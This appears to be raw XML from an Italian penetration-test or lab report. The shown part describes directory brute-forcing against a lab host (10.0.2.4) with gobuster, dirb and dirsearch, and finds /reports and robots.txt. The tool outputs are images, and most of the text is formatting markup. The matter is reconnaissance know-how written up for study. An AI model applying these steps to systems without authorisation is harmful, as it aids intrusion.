        <w:t xml:space="preserve"> la</w:t>
      </w:r>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri-Bold" w:hAnsi="Calibri-Bold"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="404040"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Web Crawler &amp; Directory </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3A65223F" w14:textId="40D76EF8" w:rsidR="001C0326" w:rsidRDefault="001C0326" w:rsidP="001C0326">
      <w:r>
        <w:t xml:space="preserve">Il primo tool è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001C0326">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">dove andiamo ad applicare una </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001C0326">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Bruteforce</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001C0326">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Directory</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:t xml:space="preserve">tramite </w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D" w:rsidRPr="000B7D0D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>dir</w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:t xml:space="preserve">, successivamente specifichiamo </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">l’indirizzo </w:t>
      </w:r>
      <w:r w:rsidRPr="005D7D15">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>http://10.0.2.4/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:t xml:space="preserve">il percorso della </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000B7D0D" w:rsidRPr="000B7D0D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>wordlist</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000B7D0D" w:rsidRPr="000B7D0D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:t>da utilizzare per l’attacco</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2881611F" w14:textId="77777777" w:rsidR="001C0326" w:rsidRDefault="001C0326" w:rsidP="001C0326"/>
    <w:p w14:paraId="1CC7FC97" w14:textId="23DAC0AB" w:rsidR="00FD2EDD" w:rsidRDefault="001C0326" w:rsidP="00FD2EDD">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251680768" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="1A2D9D03" wp14:editId="7CCE97DD">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1638300</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="798118" cy="137424"/>
                <wp:effectExtent l="0" t="0" r="21590" b="15240"/>
                <wp:wrapNone/>
                <wp:docPr id="2107955286" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="798118" cy="137424"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="40CB188E" w14:textId="77777777" w:rsidR="001C0326" w:rsidRDefault="001C0326" w:rsidP="001C03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D9D03" id="_x0000_s1037" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:129pt;width:62.85pt;height:10.8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miUgIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X21n6dIGdYqsRYYB&#10;QVugLXpWZCk2IIsapcTOfv0o2Wm6bqdhF5kUKX48Pvrqum8N2yv0DdiSF2c5Z8pKqBq7Lfnz0+rT&#10;BWc+CFsJA1aV/KA8v158/HDVubmaQA2mUsgoiPXzzpW8DsHNs8zLWrXCn4FTlowasBWBVNxmFYqO&#10;orcmm+T5l6wDrByCVN7T7e1g5IsUX2slw73WXgVmSk61hXRiOjfxzBZXYr5F4epGjmWIf6iiFY2l&#10;pK+hbkUQbIfNH6HaRiJ40OFMQpuB1o1UqQfqpsjfdfNYC6dSLwSOd68w+f8XVt7tH90DEgyd83NP&#10;Yuyi19jGL9XH+gTW4RUs1Qcm6XJ2eVEUNF1JpuLzbDqZRjCz02OHPnxT0LIolBxpFgkisV/7MLge&#10;XWIuC6vGmDQPY1lX8sn5NKeRSUG00EYEEltXldzbLWfCbIlvMmAK6cE0VXweA3ncbm4Msr2IM8+/&#10;5qs0ZqrsN7eY+1b4evBLprEBY2MYldgzlnoCJ0qh3/SsoVKKIj6JVxuoDg/IEAaGeSdXDSVYCx8e&#10;BBKlqBNak3BPhzZA7cEocVYD/vzbffSnSZOVs44oSq3/2AlUnJnvljhwWUynkdNJmZ7PJqTgW8vm&#10;rcXu2hsgRApaSCeTGP2DOYoaoX2hbVrGrGQSVlLuAeRRuQnD6tA+SrVcJjfisRNhbR+djMEjdBHa&#10;p/5FoBtnH4g0d3Cks5i/o8DgO5BguQugm8SPE67Eq6jQDiSGjfsal+ytnrxOf5XFLwAAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAEiz7/zdAAAACAEAAA8AAABkcnMvZG93bnJldi54bWxMj8FuwkAMRO+V+g8r&#10;V+qtbAgCQpoNqipV6oFKLfABS2KSiKw32jUQ/r7m1N5sz2j8pliPrlcXDLHzZGA6SUAhVb7uqDGw&#10;3328ZKAiW6pt7wkN3DDCunx8KGxe+yv94GXLjZIQirk10DIPudaxatHZOPEDkmhHH5xlWUOj62Cv&#10;Eu56nSbJQjvbkXxo7YDvLVan7dkZcJtqFfizme2/Z9lt0+1YH92XMc9P49srKMaR/8xwxxd0KIXp&#10;4M9UR9UbkCJsIJ1nMtzldL4EdZDLcrUAXRb6f4HyFwAA//8DAFBLAQItABQABgAIAAAAIQC2gziS&#10;/gAAAOEBAAATAAAAAAAAAAAAAAAAAAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgA&#10;AAAhADj9If/WAAAAlAEAAAsAAAAAAAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAGAAgA&#10;AAAhAGcVuaJSAgAAnQQAAA4AAAAAAAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAG&#10;AAgAAAAhAEiz7/zdAAAACAEAAA8AAAAAAAAAAAAAAAAArAQAAGRycy9kb3ducmV2LnhtbFBLBQYA&#10;AAAABAAEAPMAAAC2BQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="40CB188E" w14:textId="77777777" w:rsidR="001C0326" w:rsidRDefault="001C0326" w:rsidP="001C0326">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FA2D494" wp14:editId="693B2F06">
            <wp:extent cx="5269230" cy="2236470"/>
            <wp:effectExtent l="0" t="0" r="7620" b="0"/>
            <wp:docPr id="12665928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230" cy="2236470"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00FD2EDD" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="00FD2EDD" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00FD2EDD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Output del tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00FD2EDD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>gobuster</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="728F189B" w14:textId="52C24A28" w:rsidR="000B7D0D" w:rsidRDefault="000B7D0D" w:rsidP="001C0326">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61C9059B" w14:textId="11A6678A" w:rsidR="00FD2EDD" w:rsidRDefault="001C0326" w:rsidP="001C0326">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Viene riscontrata </w:t>
      </w:r>
      <w:r w:rsidR="00FD2EDD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">solo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>una directory /reports</w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027845D7" w14:textId="5811533F" w:rsidR="001C0326" w:rsidRDefault="00451291" w:rsidP="001C0326">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251726848" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="263EC052" wp14:editId="0E9ACBE0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>465667</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2626360</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3208866" cy="550333"/>
                <wp:effectExtent l="0" t="0" r="10795" b="21590"/>
                <wp:wrapNone/>
                <wp:docPr id="2111382995" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3208866" cy="550333"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="09C20898" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="004512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EC052" id="_x0000_s1038" style="position:absolute;left:0;text-align:left;margin-left:36.65pt;margin-top:206.8pt;width:252.65pt;height:43.3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XwOUgIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+081wZ1iqxFhgFF&#10;WyAdemZkKTYgSxqlxM5+/SjZabpup2EXmRQpPj5+9PVN12h2kOhrawo+usg5k0bYsja7gn9/Xn+6&#10;5MwHMCVoa2TBj9Lzm+XHD9etW8ixrawuJTIKYvyidQWvQnCLLPOikg34C+ukIaOy2EAgFXdZidBS&#10;9EZn4zyfZ63F0qEV0nu6veuNfJniKyVFeFTKy8B0wam2kE5M5zae2fIaFjsEV9ViKAP+oYoGakNJ&#10;X0PdQQC2x/qPUE0t0HqrwoWwTWaVqoVMPVA3o/xdN5sKnEy9EDjevcLk/19Y8XDYuCckGFrnF57E&#10;2EWnsIlfqo91CazjK1iyC0zQ5WScX17O55wJss1m+WQyiWhm59cOffgqbcOiUHCkYSSM4HDvQ+96&#10;conJjF3XWqeBaMPago9n05xmJoB4oTQEEhtXFtybHWegd0Q4ETCF9FbXZXweA3ncbW81sgPEoedf&#10;8nWaM1X2m1vMfQe+6v2SaWhAmxhGJvoMpZ7RiVLoth2rqZTROD6JV1tbHp+Qoe0p5p1Y15TgHnx4&#10;AiROUSe0J+GRDqUttWcHibPK4s+/3Ud/GjVZOWuJo9T6jz2g5Ex/M0SCq9F0GkmdlOns85gUfGvZ&#10;vrWYfXNrCZERbaQTSYz+QZ9EhbZ5oXVaxaxkAiModw/yoNyGfndoIYVcrZIbEdlBuDcbJ2LwCF2E&#10;9rl7AXTD7AOx5sGe+AyLdxTofXsSrPbBqjrx44wr8SoqtASJYcPCxi17qyev829l+QsAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAKPjb77eAAAACgEAAA8AAABkcnMvZG93bnJldi54bWxMj8FOwzAMhu9IvENk&#10;JG4sGYGtlKYTQkLiMCTY9gBZ47UVjVMl2da9PeYEt9/yp9+fq9XkB3HCmPpABuYzBQKpCa6n1sBu&#10;+3ZXgEjZkrNDIDRwwQSr+vqqsqULZ/rC0ya3gksoldZAl/NYSpmaDr1NszAi8e4QoreZx9hKF+2Z&#10;y/0g75VaSG974gudHfG1w+Z7c/QG/Lp5ivm91btPXVzW/TbLg/8w5vZmenkGkXHKfzD86rM61Oy0&#10;D0dySQwGllozaeBhrhcgGHhcFhz2HJTSIOtK/n+h/gEAAP//AwBQSwECLQAUAAYACAAAACEAtoM4&#10;kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAI&#10;AAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAI&#10;AAAAIQA4wXwOUgIAAJ4EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQA&#10;BgAIAAAAIQCj42++3gAAAAoBAAAPAAAAAAAAAAAAAAAAAKwEAABkcnMvZG93bnJldi54bWxQSwUG&#10;AAAAAAQABADzAAAAtwUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="09C20898" w14:textId="77777777" w:rsidR="00451291" w:rsidRDefault="00451291" w:rsidP="00451291">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00FD2EDD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Successivamente cerchiamo di scoprire altre informazioni sulle directory tramite il </w:t>
      </w:r>
      <w:r w:rsidR="00FD2EDD" w:rsidRPr="00FD2EDD">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>tool dirb</w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>, antiamo a specificare l’indirizzo sui cui sferrare l’attacco.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C85CAFA" w14:textId="5E21F719" w:rsidR="000B7D0D" w:rsidRDefault="00FD2EDD" w:rsidP="000B7D0D">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FD2EDD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251681792" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="609A8B3B" wp14:editId="1D11F8CC">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4389120" cy="3147060"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="8592899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89910" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId38"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4389120" cy="3147060"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="000B7D0D" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="00D02E6F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00A72AA8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000B7D0D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Output del tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000B7D0D">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1859CC96" w14:textId="77777777" w:rsidR="000B7D0D" w:rsidRDefault="000B7D0D" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B23163B" w14:textId="37DED6F3" w:rsidR="000B7D0D" w:rsidRDefault="000B7D0D" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Possiamo vedere che </w:t>
      </w:r>
      <w:r w:rsidRPr="008A7B80">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>dirb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> ha trovato altre directory</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> e il file </w:t>
      </w:r>
      <w:r w:rsidR="00352443" w:rsidRPr="00352443">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>robots.txt</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> gia </w:t>
      </w:r>
      <w:r w:rsidR="00287683">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>ccennato in precedenza.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05692A4D" w14:textId="5B972E3B" w:rsidR="00D074E5" w:rsidRDefault="005E1E61" w:rsidP="000B7D0D">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Utilizziamo un altro tool</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008A7B80">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">dirsearch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>per ve</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">rificare </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>oltre alle directory anche i file nascosti</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">. Come specificato nella Figuara 13 cerchiamo file </w:t>
      </w:r>
      <w:r w:rsidR="008A7F8A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">con estensione: php, aspx, </w:t>
      </w:r>
      <w:r w:rsidR="008A7F8A">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>jsp, html e js</w:t>
      </w:r>
      <w:r w:rsidR="00D074E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> e effett</w:t>
      </w:r>
      <w:r w:rsidR="00352443">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>uiamo</w:t>
      </w:r>
      <w:r w:rsidR="00D074E5">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> la ricerca con un metodo http GET, con numero di Threads uguae a 30 e infine la dimensione della Wordlist.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D84B44" w14:textId="7BBC4442" w:rsidR="00D02E6F" w:rsidRPr="00B01334" w:rsidRDefault="008D2168" w:rsidP="00D02E6F">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251737088" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="00938779" wp14:editId="7C668F7C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3322954</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2895600" cy="126577"/>
                <wp:effectExtent l="0" t="0" r="19050" b="26035"/>
                <wp:wrapNone/>
                <wp:docPr id="400927927" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="2895600" cy="126577"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="22315E63" w14:textId="77777777" w:rsidR="008D2168" w:rsidRDefault="008D2168" w:rsidP="008D21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38779" id="_x0000_s1039" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:261.65pt;width:228pt;height:9.95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jHhUQIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X+xkSdoGdYqsRYYB&#10;RRsgHXpmZCk2IEsapcTufv0o2Wm6bqdhF5kUKX48Pvr6pms0O0r0tTUFH49yzqQRtqzNvuDfn9af&#10;LjnzAUwJ2hpZ8Bfp+c3y44fr1i3kxFZWlxIZBTF+0bqCVyG4RZZ5UckG/Mg6acioLDYQSMV9ViK0&#10;FL3R2STP51lrsXRohfSebu96I1+m+EpJER6V8jIwXXCqLaQT07mLZ7a8hsUewVW1GMqAf6iigdpQ&#10;0tdQdxCAHbD+I1RTC7TeqjAStsmsUrWQqQfqZpy/62ZbgZOpFwLHu1eY/P8LKx6OW7dBgqF1fuFJ&#10;jF10Cpv4pfpYl8B6eQVLdoEJupxcXs3mOWEqyDaezGcXFxHN7PzaoQ9fpW1YFAqONIyEERzvfehd&#10;Ty4xmbHrWus0EG1YSxlm0xQfiBdKQ6BUjSsL7s2eM9B7IpwImEJ6q+syPo+BPO53txrZEeLQ8y/5&#10;Os2ZKvvNLea+A1/1fsk0NKBNDCMTfYZSz+hEKXS7jtVUyvhzfBKvdrZ82SBD21PMO7GuKcE9+LAB&#10;JE4RUrQn4ZEOpS21ZweJs8riz7/dR38aNVk5a4mj1PqPA6DkTH8zRIKr8XQaSZ2U6exiQgq+teze